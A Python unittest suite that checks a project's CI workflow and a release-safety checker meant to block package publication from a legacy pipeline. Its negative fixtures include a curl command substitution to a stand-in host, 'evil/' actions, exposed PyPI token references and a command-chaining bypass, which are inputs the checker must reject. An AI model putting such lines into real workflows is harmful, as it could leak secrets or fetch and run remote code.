"""Contracts for the complete Veridist pull-request validation workflow."""

from __future__ import annotations

import json
import re
import tempfile
import tomllib
import unittest
from importlib.util import module_from_spec, spec_from_file_location
from pathlib import Path
from types import ModuleType
from unittest import mock

REPOSITORY_ROOT = Path(__file__).resolve().parents[3]
WORKFLOW_PATH = REPOSITORY_ROOT / ".github" / "workflows" / "v1-ci.yml"
LEGACY_WORKFLOW_PATH = REPOSITORY_ROOT / ".github" / "workflows" / "ci.yml"
LEGACY_RELEASE_SAFETY_PATH = (
    REPOSITORY_ROOT / "python" / "tools" / "check_legacy_release_safety.py"
)
LEGACY_RELEASE_MANIFEST_PATH = (
    REPOSITORY_ROOT / "python" / "quality" / "legacy-ci-manifest.json"
)
PYPROJECT_PATH = REPOSITORY_ROOT / "python" / "pyproject.toml"
BROWSER_TEST_PATH = (
    REPOSITORY_ROOT / "python" / "tests" / "browser" / "test_exponential_report_rtl.py"
)


CHECKOUT_PIN = "actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2"


def _load_legacy_release_safety_checker() -> ModuleType:
    spec = spec_from_file_location("legacy_release_safety", LEGACY_RELEASE_SAFETY_PATH)
    if spec is None or spec.loader is None:
        raise RuntimeError("legacy release safety checker is not loadable")
    module = module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def _workflow_with_step(step: str) -> str:
    return f"jobs:\n  check:\n    steps:\n      - {step}\n"


class VeridistWorkflowContractTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls) -> None:
        cls.workflow = WORKFLOW_PATH.read_text(encoding="utf-8")

    def test_workflow_runs_for_every_push_and_main_pull_request(self) -> None:
        self.assertIn("name: veridist-ci", self.workflow)
        self.assertIn("  push:", self.workflow)
        self.assertIn("  pull_request:\n    branches: [main]", self.workflow)
        self.assertIn("  workflow_dispatch:", self.workflow)
        self.assertNotIn("v1-foundation", self.workflow)
        self.assertNotIn("paths:", self.workflow)

    def test_static_job_runs_declared_lint_and_strict_type_checks(self) -> None:
        self.assertIn("  static:", self.workflow)
        self.assertIn("name: veridist / static", self.workflow)
        self.assertIn('python-version: "3.11"', self.workflow)
        self.assertIn('python -m pip install -e ".[lint]"', self.workflow)
        self.assertIn("python -m ruff check src tests docs tools", self.workflow)
        self.assertIn("python -m mypy src", self.workflow)

    def test_test_matrix_enforces_branch_coverage_on_all_supported_pythons(self) -> None:
        self.assertIn("  tests:", self.workflow)
        self.assertIn("name: veridist / tests (${{ matrix.python-version }})", self.workflow)
        self.assertIn(
            'python-version: ["3.11", "3.12", "3.13", "3.14"]', self.workflow
        )
        self.assertIn('python -m pip install -e ".[test,arrow]"', self.workflow)
        self.assertIn("python -m pytest --cov=veridist --cov-branch", self.workflow)
        self.assertIn("--ignore=tests/docs/test_docs_toolchain.py", self.workflow)
        self.assertIn("--cov-report=json:coverage.json", self.workflow)
        tests_block = self.workflow.split("  tests:", maxsplit=1)[1].split(
            "  package:", maxsplit=1
        )[0]
        self.assertIn(
            f"uses: {CHECKOUT_PIN}\n        with:\n          fetch-depth: 0", tests_block
        )
        coverage_step = self.workflow.split(
            "      - name: Test with branch coverage", maxsplit=1
        )[1].split("      - name: Enforce coverage gates", maxsplit=1)[0]
        self.assertEqual(
            re.findall(r"--ignore=\S+", coverage_step),
            ["--ignore=tests/docs/test_docs_toolchain.py"],
        )
        self.assertEqual(re.findall(r"--cov=\S+", coverage_step), ["--cov=veridist"])
        for forbidden_ignore in (
            "--ignore=tests/docs",
            "--ignore=tests/docs/test_exponential_report_i18n.py",
            "--ignore=tests/reference",
            "--ignore=tests/contract",
        ):
            with self.subTest(forbidden_ignore=forbidden_ignore):
                self.assertNotIn(forbidden_ignore, re.findall(r"--ignore=\S+", coverage_step))
        self.assertIn("python tools/check_coverage.py --project-root .", self.workflow)
        self.assertIn("--manifest quality/coverage-manifest.json", self.workflow)
        self.assertIn("--coverage-json coverage.json", self.workflow)

    def test_non_linux_job_runs_the_suite_on_windows_and_macos_with_one_python(self) -> None:
        job = re.search(r"(?ms)^  tests-os:$(.*?)(?=^  \S|\Z)", self.workflow)
        self.assertIsNotNone(job)
        block = job.group(0)
        self.assertIn("name: veridist / tests (${{ matrix.os }}, 3.12)", block)
        self.assertIn("runs-on: ${{ matrix.os }}", block)
        self.assertIn("os: [windows-latest, macos-latest]", block)
        self.assertIn("fail-fast: false", block)
        self.assertIn('python-version: "3.12"', block)
        self.assertEqual(re.findall(r"python-version:", block), ["python-version:"])
        self.assertIn("working-directory: python", block)
        self.assertIn(f"uses: {CHECKOUT_PIN}\n        with:\n          fetch-depth: 0", block)
        self.assertIn('python -m pip install -e ".[test,arrow]"', block)
        self.assertEqual(
            re.findall(r"python -m pytest.*", block),
            ["python -m pytest --ignore=tests/docs/test_docs_toolchain.py"],
        )
        self.assertNotIn("continue-on-error", block)
        self.assertNotIn("--deselect", block)
        self.assertNotIn("-k ", block)

    def test_package_job_builds_checks_and_installs_the_wheel_outside_checkout(self) -> None:
        self.assertIn("  package:", self.workflow)
        self.assertIn("name: veridist / package", self.workflow)
        self.assertIn(
            'python -m pip install "build>=1.2,<2" "twine>=6,<7"', self.workflow
        )
        self.assertIn("python -m build --sdist --wheel", self.workflow)
        self.assertIn("python -m twine check dist/*", self.workflow)
        self.assertIn("Verify built distributions remain legacy-isolated", self.workflow)
        self.assertIn("python tools/check_legacy_isolation.py", self.workflow)
        self.assertIn("--artifact", self.workflow)
        self.assertIn("artifacts=(dist/*.whl dist/*.tar.gz)", self.workflow)
        self.assertIn('python -m venv "$RUNNER_TEMP/veridist-wheel"', self.workflow)
        self.assertIn(
            '"$RUNNER_TEMP/veridist-wheel/bin/python" -m pip install dist/*.whl',
            self.workflow,
        )
        self.assertIn('"$RUNNER_TEMP/veridist-wheel/bin/python" -m pip check', self.workflow)
        self.assertIn('cd "$RUNNER_TEMP"', self.workflow)
        self.assertIn("importlib.metadata", self.workflow)
        self.assertIn("py.typed", self.workflow)
        for smoke_contract in (
            "CsvLifetimeLimits",
            "CsvLifetimeSchema",
            "PublicSourceId",
            "fit_exponential_csv",
            "render_exponential_report",
            "ReportLocale.FA",
            "time,event_observed",
            "assert fit.rate == 0.5",
            "assert fit.inference == 'not_provided'",
            "assert fit.censoring_assumption == 'independent_right_censoring'",
            'assert \'lang="fa" dir="rtl"\' in report',
        ):
            with self.subTest(smoke_contract=smoke_contract):
                self.assertIn(smoke_contract, self.workflow)
        self.assertIn(
            r'source.write_text("time,event_observed\n1,1\n1,0\n", encoding="utf-8")',
            self.workflow,
        )
        self.assertNotIn(
            r'source.write_text("time,event_observed\\n1,1\\n1,0\\n", encoding="utf-8")',
            self.workflow,
        )

    def test_docs_job_runs_the_actual_three_locale_toolchain(self) -> None:
        self.assertIn("  docs:", self.workflow)
        self.assertIn("name: veridist / docs", self.workflow)
        self.assertIn('python -m pip install -e ".[docs,test]"', self.workflow)
        commands = (
            'python -m unittest discover -s tests/docs -p "test_*.py" -v',
            "python docs/toolchain.py check",
            "sphinx-build -b gettext -W -n docs/source docs/_build/gettext",
            "sphinx-build -b html -W -n docs/source docs/_build/en/html -D language=en",
            "sphinx-build -b html -W -n docs/source docs/_build/fa/html -D language=fa",
            "sphinx-build -b html -W -n docs/source docs/_build/de/html -D language=de",
            "sphinx-build -b linkcheck -W -n docs/source docs/_build/linkcheck -D language=en",
            "python docs/toolchain.py render docs/_build/en/html en",
            "python docs/toolchain.py render docs/_build/fa/html fa",
            "python docs/toolchain.py render docs/_build/de/html de",
        )
        for command in commands:
            with self.subTest(command=command):
                self.assertIn(command, self.workflow)
        self.assertNotIn("sphinx-intl update", self.workflow)
        self.assertNotIn("-b doctest", self.workflow)
        upload_start = self.workflow.index("      - name: Retain rendered documentation evidence")
        upload_block = self.workflow[upload_start : self.workflow.index("  browser-rtl:")]
        self.assertIn("if: always()", upload_block)
        self.assertIn("if-no-files-found: warn", upload_block)
        self.assertLess(
            self.workflow.index("python docs/toolchain.py render docs/_build/de/html de"),
            upload_start,
        )

    def test_browser_job_uses_pinned_extra_and_requires_exact_screenshot_evidence(self) -> None:
        project = tomllib.loads(PYPROJECT_PATH.read_text(encoding="utf-8"))
        extras = project["project"]["optional-dependencies"]
        self.assertEqual(extras["browser"], ["playwright==1.62.0"])
        self.assertFalse(any("playwright" in dependency for dependency in extras["test"]))

        self.assertIn("  browser-rtl:", self.workflow)
        self.assertIn("name: veridist / browser rtl", self.workflow)
        self.assertIn("key: playwright-${{ runner.os }}-1.62.0", self.workflow)
        self.assertIn('python -m pip install -e ".[test,browser,docs]"', self.workflow)
        self.assertIn("python -m playwright install --with-deps chromium", self.workflow)
        self.assertIn('VERIDIST_BROWSER_TESTS: "1"', self.workflow)
        self.assertIn("tests.browser.test_sphinx_rtl_pages", self.workflow)
        self.assertIn("find artifacts/browser-rtl", self.workflow)
        self.assertIn("-type f -name '*.png' -size +0c", self.workflow)
        self.assertIn('test "${#screenshots[@]}" -eq 4', self.workflow)
        self.assertIn("exponential-report-fa-failure.png", self.workflow)
        self.assertIn("exponential-report-fa-success.png", self.workflow)
        self.assertIn("sphinx-api-fa.png", self.workflow)
        self.assertIn("sphinx-index-fa.png", self.workflow)
        upload_start = self.workflow.index("      - name: Retain browser screenshots")
        upload_block = self.workflow[upload_start : self.workflow.index("  veridist-gate:")]
        self.assertIn("if: always()", upload_block)
        self.assertIn("if-no-files-found: warn", upload_block)
        self.assertLess(
            self.workflow.index("      - name: Verify exact screenshot evidence set"),
            upload_start,
        )

    def test_browser_contract_is_opt_in_and_cleans_default_temporary_artifacts(self) -> None:
        browser_test = BROWSER_TEST_PATH.read_text(encoding="utf-8")
        self.assertIn('os.environ.get("VERIDIST_BROWSER_TESTS") == "1"', browser_test)
        self.assertIn("tempfile.TemporaryDirectory()", browser_test)
        self.assertNotIn("tempfile.mkdtemp()", browser_test)
        for property_name in ("documentDirection", "reportDirection", "reportAlignment"):
            with self.subTest(property_name=property_name):
                self.assertIn(property_name, browser_test)
        self.assertIn('"unicodeBidi": "isolate"', browser_test)
        self.assertIn("self.assertGreater(screenshot.stat().st_size, 0)", browser_test)
        sphinx_browser_test = (
            REPOSITORY_ROOT / "python" / "tests" / "browser" / "test_sphinx_rtl_pages.py"
        ).read_text(encoding="utf-8")
        for required in (
            "sphinx",
            "api.html",
            "exponential-right-censoring.html",
            "index.html",
            "unicodeBidi",
            "code.literal",
            ".highlight pre",
            "table.docutils",
            ".math",
            'wait_until="load"',
        ):
            with self.subTest(required=required):
                self.assertIn(required, sphinx_browser_test)
        self.assertNotIn(" || ", sphinx_browser_test)

    def test_aggregate_gate_fails_if_any_required_job_does_not_succeed(self) -> None:
        self.assertIn("  veridist-gate:", self.workflow)
        self.assertIn("name: veridist / gate", self.workflow)
        self.assertIn(
            "needs: [static, tests, tests-os, package, docs, browser-rtl]", self.workflow
        )
        self.assertIn("if: always()", self.workflow)
        for result in (
            "needs.static.result",
            "needs.tests.result",
            "needs.tests-os.result",
            "needs.package.result",
            "needs.docs.result",
            "needs.browser-rtl.result",
        ):
            with self.subTest(result=result):
                self.assertIn(result, self.workflow)
        self.assertIn("TEST_OS_RESULT: ${{ needs.tests-os.result }}", self.workflow)
        self.assertIn('"$TEST_RESULT" "$TEST_OS_RESULT" "$PACKAGE_RESULT"', self.workflow)
        self.assertNotIn("continue-on-error", self.workflow)
        self.assertNotIn("|| true", self.workflow)

    def test_aggregate_gate_runs_from_the_checkout_root_without_a_checkout(self) -> None:
        self.assertNotIn("defaults:\n  run:\n    working-directory: python", self.workflow)
        for job in ("static", "tests", "tests-os", "package", "docs", "browser-rtl"):
            with self.subTest(job=job):
                job_block = re.search(
                    rf"(?ms)^  {job}:$(.*?)(?=^  \S|\Z)", self.workflow
                )
                self.assertIsNotNone(job_block)
                self.assertIn("working-directory: python", job_block.group(0))

        gate_start = self.workflow.index("  veridist-gate:")
        self.assertNotIn("working-directory:", self.workflow[gate_start:])

    def test_legacy_workflow_cannot_trigger_or_publish_a_release(self) -> None:
        """Legacy CI may validate legacy code but must never publish an artifact."""
        self.assertTrue(LEGACY_RELEASE_SAFETY_PATH.is_file())
        checker = _load_legacy_release_safety_checker()
        legacy_workflow = LEGACY_WORKFLOW_PATH.read_text(encoding="utf-8")
        self.assertEqual(checker.find_violations(legacy_workflow), ())
        self.assertTrue(LEGACY_RELEASE_MANIFEST_PATH.is_file())

    def test_legacy_release_safety_rejects_every_publication_capability(self) -> None:
        checker = _load_legacy_release_safety_checker()
        unsafe_workflows = {
            "release trigger mapping": "on:\n  release:\n    types: [published]\n",
            "release trigger list": "on: [push, release]\n",
            "quoted release trigger": "on:\n  'release': [published]\n",
            "publication job": "jobs:\n  publish-wheel:\n    runs-on: ubuntu-latest\n",
            "release job": "jobs:\n  release:\n    runs-on: ubuntu-latest\n",
            "trusted publishing permission": "permissions:\n  id-token: write\n",
            "package write permission": "permissions:\n  packages: write\n",
            "nested job permission": (
                "jobs:\n  check:\n    permissions:\n      packages: write\n"
            ),
            "deployment environment": "jobs:\n  check:\n    environment:\n      name: pypi\n",
            "secret reference": (
                "jobs:\n  check:\n    env:\n      TOKEN: ${{ secrets.PYPI_TOKEN }}\n"
            ),
            "pypi action": _workflow_with_step(
                "uses: pypa/gh-action-pypi-publish@release/v1"
            ),
            "twine command": _workflow_with_step("run: python -m twine upload dist/*"),
            "uv command": _workflow_with_step("run: uv publish"),
            "hatch command": _workflow_with_step("run: hatch publish"),
            "poetry command": _workflow_with_step("run: poetry publish"),
            "flit command": _workflow_with_step("run: flit publish"),
            "generic publish command": _workflow_with_step("run: release-client publish"),
            "echo command-chain bypass": _workflow_with_step(
                "run: echo harmless && python -m twine upload dist/*"
            ),
            "generic upload action": _workflow_with_step("uses: owner/upload-to-pypi@v1"),
        }
        for name, workflow in unsafe_workflows.items():
            with self.subTest(name=name):
                self.assertTrue(checker.find_violations(workflow))

    def test_legacy_release_safety_ignores_comments_but_rejects_all_structural_drift(self) -> None:
        checker = _load_legacy_release_safety_checker()
        baseline = LEGACY_WORKFLOW_PATH.read_text(encoding="utf-8")
        self.assertEqual(
            checker.find_violations(baseline + "\n# harmless prose: twine upload\n"),
            (),
        )
        unsafe_workflows = {
            "unknown job": baseline.replace(
                "jobs:\n", "jobs:\n  unknown:\n    runs-on: ubuntu-latest\n", 1
            ),
            "reusable workflow": baseline.replace(
                "  legacy-gate:\n", "  legacy-gate:\n    uses: evil/reusable@v1\n", 1
            ),
            "bracket secret": baseline.replace(
                "RELEVANT: ${{ needs.legacy-scope.outputs.relevant }}",
                "RELEVANT: ${{ secrets['PYPI_TOKEN'] }}",
                1,
            ),
            "unknown action": baseline.replace("actions/checkout@v4", "evil/publish@v1", 1),
            "command substitution": baseline.replace(
                "python python/tools/ci_scope.py legacy-gate",
                "$(curl https://example.invalid/publisher)",
                1,
            ),
        }
        for name, workflow in unsafe_workflows.items():
            with self.subTest(name=name):
                self.assertTrue(checker.find_violations(workflow))

    def test_legacy_manifest_semantics_survive_a_regenerated_workflow_digest(self) -> None:
        checker = _load_legacy_release_safety_checker()
        baseline = LEGACY_WORKFLOW_PATH.read_text(encoding="utf-8")
        variants = {
            "publisher action": baseline.replace("actions/checkout@v4", "evil/publish@v1", 1),
            "bracket secret": baseline.replace(
                "EVENT_NAME: ${{ github.event_name }}",
                "EVENT_NAME: ${{ secrets['PYPI_TOKEN'] }}",
                1,
            ),
            "dot secret": baseline.replace(
                "EVENT_NAME: ${{ github.event_name }}",
                "EVENT_NAME: ${{ secrets.PYPI_TOKEN }}",
                1,
            ),
            "publisher command": baseline.replace(
                "python python/tools/ci_scope.py legacy-gate",
                "poetry publish",
                1,
            ),
            "unexpected step environment": baseline.replace(
                "      - uses: actions/setup-python@v5\n        with:",
                (
                    "      - uses: actions/setup-python@v5\n        env:\n"
                    "          TOKEN: safe-looking\n        with:"
                ),
                1,
            ),
            "unexpected with payload": baseline.replace(
                "fetch-depth: 0",
                "fetch-depth: 0\n          TOKEN: safe-looking",
                1,
            ),
            "changed allowed environment": baseline.replace(
                "EVENT_NAME: ${{ github.event_name }}",
                "EVENT_NAME: ${{ github.event_name }}\n          EXTRA: value",
                1,
            ),
            "allowed with payload transplanted to another step": baseline.replace(
                "with:\n          python-version: \"3.11\"",
                "with:\n          fetch-depth: 0",
                1,
            ),
            "spaced bracket secret": baseline.replace(
                "EVENT_NAME: ${{ github.event_name }}",
                "EVENT_NAME: ${{ secrets [ 'PYPI_TOKEN' ] }}",
                1,
            ),
            "spaced dot secret": baseline.replace(
                "EVENT_NAME: ${{ github.event_name }}",
                "EVENT_NAME: ${{ secrets .TOKEN }}",
                1,
            ),
        }
        baseline_manifest = json.loads(
            LEGACY_RELEASE_MANIFEST_PATH.read_text(encoding="utf-8")
        )
        self.assertIn("step_sha256", baseline_manifest)
        for name, workflow in variants.items():
            with self.subTest(name=name), tempfile.TemporaryDirectory() as directory:
                document = checker._load_document(workflow)
                self.assertIsNotNone(document)
                manifest = dict(baseline_manifest)
                manifest["workflow_sha256"] = checker._canonical_sha256(document)
                manifest["approved_actions"], manifest["step_sha256"] = checker._semantic_inventory(
                    document
                )
                path = Path(directory) / "manifest.json"
                path.write_text(json.dumps(manifest), encoding="utf-8")
                with mock.patch.object(checker, "_MANIFEST_PATH", path):
                    self.assertTrue(checker.find_violations(workflow))
        self.assertFalse(checker._contains_secret("prose says secrets are unavailable"))

    def test_legacy_manifest_rejects_noninteger_schema_and_duplicate_keys(self) -> None:
        checker = _load_legacy_release_safety_checker()
        workflow = LEGACY_WORKFLOW_PATH.read_text(encoding="utf-8")
        manifest = json.loads(LEGACY_RELEASE_MANIFEST_PATH.read_text(encoding="utf-8"))
        for value in (True, 2.0, "2"):
            with self.subTest(schema_version=value), tempfile.TemporaryDirectory() as directory:
                manifest["schema_version"] = value
                path = Path(directory) / "manifest.json"
                path.write_text(json.dumps(manifest), encoding="utf-8")
                with mock.patch.object(checker, "_MANIFEST_PATH", path):
                    self.assertTrue(checker.find_violations(workflow))
        with tempfile.TemporaryDirectory() as directory:
            path = Path(directory) / "manifest.json"
            path.write_text('{"schema_version": 2, "schema_version": 2}', encoding="utf-8")
            self.assertIsNone(checker._load_manifest(path))


if __name__ == "__main__":
    unittest.main()
